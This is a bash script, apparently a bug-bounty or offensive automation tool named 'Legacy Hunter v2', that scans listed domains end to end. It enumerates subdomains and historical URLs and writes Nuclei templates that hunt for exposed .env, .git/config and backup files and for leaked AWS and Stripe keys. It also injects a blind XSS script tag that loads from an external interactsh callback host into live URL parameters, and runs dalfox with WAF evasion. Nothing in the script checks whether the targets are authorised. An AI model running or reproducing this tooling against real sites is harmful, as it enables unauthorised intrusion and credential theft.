#!/usr/bin/env bash
# ============================================================
#  Legacy Hunter v2 — Full Arsenal
# ============================================================
set -uo pipefail
IFS=$'\n\t'
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'
PURPLE='\033[0;35m'; CYAN='\033[0;36m'; NC='\033[0m'; BOLD='\033[1m'
hdr()  { echo -e "\n${PURPLE}${BOLD}═══ $1 ═══${NC}"; }
ok()   { echo -e "${GREEN}  [+]${NC} $1"; }
warn() { echo -e "${YELLOW}  [!]${NC} $1"; }
err()  { echo -e "${RED}  [-]${NC} $1"; }
cnt()  { wc -l < "$1" 2>/dev/null | tr -d ' ' || echo 0; }

# --- توليد قوالب Nuclei المخصصة تلقائياً ---
setup_templates() {
    mkdir -p scripts/nuclei-templates
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-backup-exposure.yaml
id: legacy-backup-exposure
info:
  name: Legacy Backup File Exposure
  severity: high
  tags: exposure,backup
requests:
  - method: GET
    path: ["{{BaseURL}}/.env", "{{BaseURL}}/.env.bak", "{{BaseURL}}/backup.zip", "{{BaseURL}}/.git/config"]
    matchers-condition: or
    matchers:
      - type: word
        words: ["DB_PASSWORD", "DB_USER", "mysql://", "AWS_ACCESS_KEY"]
YAML_EOF
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-api-version.yaml
id: legacy-api-version
info:
  name: Legacy API Version Exposure
  severity: medium
requests:
  - method: GET
    path: ["{{BaseURL}}/api/v1/", "{{BaseURL}}/api/v0/", "{{BaseURL}}/swagger-ui.html"]
    matchers:
      - type: word
        words: ["swagger", "openapi", "apiVersion", "deprecated"]
YAML_EOF
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-js-secrets.yaml
id: legacy-js-secrets
info:
  name: Legacy JS Secrets Exposure
  severity: high
requests:
  - method: GET
    path: ["{{BaseURL}}/js/app.js", "{{BaseURL}}/static/js/app.js"]
    matchers:
      - type: regex
        regex: ['AKIA[0-9A-Z]{16}', 'AIza[0-9A-Za-z_-]{35}', 'sk_live_[0-9a-zA-Z]{24,}']
YAML_EOF
    cat << 'YAML_EOF' > scripts/nuclei-templates/legacy-deprecated-headers.yaml
id: legacy-deprecated-headers
info:
  name: Deprecated Headers / Old Server Tech
  severity: info
requests:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers:
      - type: regex
        regex: ["Server: Apache/2\\.[0-2]", "Server: nginx/1\\.[0-9]"]
        part: header
YAML_EOF
}

INPUT="${1:-domains.txt}"
[ ! -f "$INPUT" ] && { err "File not found: $INPUT"; exit 1; }
DOMAINS=()
while IFS= read -r line; do
    line=$(echo "$line" | tr -d '\r' | xargs)
    [[ -z "$line" || "$line" =~ ^# ]] && continue
    DOMAINS+=("$line")
done < "$INPUT"
[ ${#DOMAINS[@]} -eq 0 ] && { err "No domains"; exit 1; }

setup_templates

ROOT="legacy_hunt_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$ROOT"
MASTER_STATS="$ROOT/.stats.txt"
> "$MASTER_STATS"
export PATH="$PATH:$HOME/go/bin:$GOPATH/bin:/usr/local/bin"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CUSTOM_NUCLEI_DIR="$(pwd)/scripts/nuclei-templates"

send_slack() { [ -z "${SLACK_WEBHOOK_URL:-}" ] && return 0; curl -s -X POST "$SLACK_WEBHOOK_URL" -H 'Content-type: application/json' --data "{\"text\":\"$1\"}" >/dev/null 2>&1 || true; }
send_discord() { [ -z "${DISCORD_WEBHOOK_URL:-}" ] && return 0; local p; p=$(python3 -c "import json,sys; print(json.dumps({'content': sys.argv[1]}))" "$1" 2>/dev/null) || return 0; curl -s -X POST "$DISCORD_WEBHOOK_URL" -H 'Content-type: application/json' --data "$p" >/dev/null 2>&1 || true; }
notify() { send_slack "$1"; send_discord "$1"; echo -e "${CYAN}  [notify]${NC} $1"; }

create_github_issue() {
    local title="$1"; local body="$2"; local labels="${3:-security,automated}"
    [ -z "${GITHUB_TOKEN:-}" ] && return 0
    local payload; payload=$(python3 -c "import json, sys; print(json.dumps({'title': sys.argv[1], 'body': sys.argv[2], 'labels': sys.argv[3].split(',')}))" "$title" "$body" "$labels" 2>/dev/null) || return 0
    curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -d "$payload" "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues" >/dev/null 2>&1 || true
}

process_domain() {
    local TARGET="$1"; local W="$2"
    TARGET=$(echo "$TARGET" | sed 's#^https\?://##' | sed 's#/.*$##' | sed 's/:.*$//')
    mkdir -p "$W"/{recon,vulns,nuclei,dalfox,sqlmap,commix,legacy,js,backups,params,robots,blind_xss}
    echo ""; echo -e "${PURPLE}${BOLD}╔═══════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}${BOLD}║  TARGET: $TARGET${NC}"
    echo -e "${PURPLE}${BOLD}╚═══════════════════════════════════════════════════╝${NC}"
    local T0; T0=$(date +%s); notify "🕰️ Starting Legacy Hunt on *$TARGET*"

    hdr "PHASE 1/10 — Subdomain Enumeration"
    (
        subfinder -d "$TARGET" -all -recursive -silent 2>/dev/null
        assetfinder --subs-only "$TARGET" 2>/dev/null
        curl -s --max-time 20 "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g'
    ) | sed 's/^\*\.//g' | tr '[:upper:]' '[:lower:]' | grep -E "\.$TARGET$|^$TARGET$" | sort -u > "$W/recon/subdomains.txt"
    ok "Subdomains: $(cnt "$W/recon/subdomains.txt")"

    hdr "PHASE 2/10 — Live Host Detection"
    httpx -l "$W/recon/subdomains.txt" -silent -title -tech-detect -status-code -ip -cname -web-server -location -random-agent -t 150 -timeout 10 -retries 2 -follow-redirects -o "$W/recon/httpx_full.txt" 2>/dev/null || true
    awk '{print $1}' "$W/recon/httpx_full.txt" 2>/dev/null | grep -E '^https?://' | sort -u > "$W/recon/live.txt"
    if [ ! -s "$W/recon/live.txt" ]; then warn "No live hosts"; echo "https://$TARGET" > "$W/recon/live.txt"; fi
    ok "Live hosts: $(cnt "$W/recon/live.txt")"

    hdr "PHASE 3/10 — Historical Robots.txt"
    if command -v robofinder >/dev/null 2>&1; then timeout 180 robofinder -u "$TARGET" -o "$W/robots/robots_history.txt" 2>/dev/null || true; fi
    ROBOTS_CNT=$(cnt "$W/robots/robots_history.txt"); ok "Robots.txt paths: $ROBOTS_CNT"

    hdr "PHASE 4/10 — Historical URL Mining"
    (
        gau "$TARGET" --threads 30 --timeout 20 --subs 2>/dev/null
        echo "$TARGET" | waybackurls 2>/dev/null
    ) | grep -E '^https?://' | grep -v '^$' | sort -u > "$W/legacy/historical_urls.txt"
    ok "Historical URLs: $(cnt "$W/legacy/historical_urls.txt")"
    grep -Ei '\.(bak|old|backup|zip|sql|env|config)$' "$W/legacy/historical_urls.txt" > "$W/backups/sensitive_files.txt" 2>/dev/null || true

    hdr "PHASE 5/10 — Crawling & Parameter Mining"
    katana -list "$W/recon/live.txt" -d 4 -jc -kf all -fx -random-agent -silent -timeout 15 -c 40 -o "$W/legacy/katana_urls.txt" 2>/dev/null || true
    cat "$W/legacy/historical_urls.txt" "$W/legacy/katana_urls.txt" 2>/dev/null | sort -u > "$W/legacy/all_urls.txt"
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | grep -oE '[?&][a-zA-Z0-9_.-]+=' | sed 's/^[?&]//' | sed 's/=$//' | sort -u > "$W/params/old_params.txt"

    hdr "PHASE 6/10 — JS Analysis"
    grep -E '\.js(\?|$)' "$W/legacy/all_urls.txt" 2>/dev/null | sed 's/?.*$//' | sort -u > "$W/js/js_urls.txt"
    ok "JS URLs: $(cnt "$W/js/js_urls.txt")"

    hdr "PHASE 7/10 — Blind XSS (interactsh)"
    BLIND_CNT=0
    if command -v interactsh-client >/dev/null 2>&1; then
        interactsh-client -o "$W/blind_xss/interactions.txt" -json > "$W/blind_xss/interactsh.log" 2>&1 &
        INTERACT_PID=$!; sleep 8
        CALLBACK=$(grep -oE '[a-z0-9]+\.[a-z0-9]+\.oast\.[a-z]+' "$W/blind_xss/interactsh.log" 2>/dev/null | head -1)
        if [ -n "$CALLBACK" ]; then
            echo "<script src=\"https://$CALLBACK\"></script>" > "$W/blind_xss/payload.txt"
            grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -20 > "$W/blind_xss/inject.txt" 2>/dev/null || true
            if [ -s "$W/blind_xss/inject.txt" ]; then
                while IFS= read -r url; do
                    test_url=$(echo "$url" | sed "s/=[^&]*/=<script src=\"https:\/\/$CALLBACK\"><\/script>/g")
                    curl -s --max-time 10 -A "$UA" "$test_url" -o /dev/null 2>/dev/null || true
                done < "$W/blind_xss/inject.txt"
                sleep 45; kill $INTERACT_PID 2>/dev/null || true
                if [ -s "$W/blind_xss/interactions.txt" ]; then
                    BLIND_CNT=$(grep -c 'interaction' "$W/blind_xss/interactions.txt" 2>/dev/null || echo 0)
                fi
            fi
        fi
    fi
    ok "Blind XSS: $BLIND_CNT"

    hdr "PHASE 8/10 — Nuclei Scans"
    nuclei -l "$W/recon/live.txt" -t "$CUSTOM_NUCLEI_DIR" -severity critical,high,medium -rl 100 -c 40 -timeout 10 -random-agent -silent -o "$W/nuclei/custom.txt" 2>/dev/null || true
    nuclei -l "$W/recon/live.txt" -severity critical,high -t http/cves/ -t http/vulnerabilities/ -rl 150 -c 50 -timeout 10 -silent -o "$W/nuclei/all_findings.txt" 2>/dev/null || true
    NUCLEI_CNT=$(grep -cE '^\[' "$W/nuclei/all_findings.txt" 2>/dev/null || echo 0)
    ok "Nuclei findings: $NUCLEI_CNT"

    hdr "PHASE 9/10 — Active Scanners"
    grep '=' "$W/legacy/all_urls.txt" 2>/dev/null | head -50 > "$W/dalfox/targets.txt" 2>/dev/null || true
    DALFOX_CNT=0
    if [ -s "$W/dalfox/targets.txt" ]; then
        dalfox file "$W/dalfox/targets.txt" --deep-domxss --waf-evasion --worker 80 --timeout 15 --silence 2>/dev/null > "$W/dalfox/findings.txt" || true
        DALFOX_CNT=$(grep -ciE '\[V\]' "$W/dalfox/findings.txt" 2>/dev/null || echo 0)
    fi
    ok "Dalfox XSS: $DALFOX_CNT"

    hdr "PHASE 10/10 — Report Generation"
    local T1; T1=$(date +%s); local DUR=$(( (T1-T0) / 60 ))
    {
        echo "# Legacy Hunter v2 Report — $TARGET"
        echo "Duration: ${DUR}m"
        echo "| Scanner | Findings |"
        echo "|---------|----------|"
        echo "| Nuclei | $NUCLEI_CNT |"
        echo "| Dalfox XSS | $DALFOX_CNT |"
        echo "| Blind XSS | $BLIND_CNT |"
        echo "Historical URLs: $(cnt "$W/legacy/historical_urls.txt")"
        echo "Backup Files: $(cnt "$W/backups/sensitive_files.txt")"
        echo "Old Params: $(cnt "$W/params/old_params.txt")"
    } > "$W/LEGACY_REPORT.md"
    
    echo "$TARGET|$NUCLEI_CNT|$DALFOX_CNT|$BLIND_CNT|$DUR" >> "$MASTER_STATS"
    notify "✅ *$TARGET* done — Nuclei:$NUCLEI_CNT Dalfox:$DALFOX_CNT Blind:$BLIND_CNT"
}

for DOMAIN in "${DOMAINS[@]}"; do
    DOMAIN_CLEAN=$(echo "$DOMAIN" | sed 's#^https\?://##' | sed 's#/.*$##' | sed 's/:.*$//')
    W="$ROOT/$DOMAIN_CLEAN"
    process_domain "$DOMAIN_CLEAN" "$W"
done
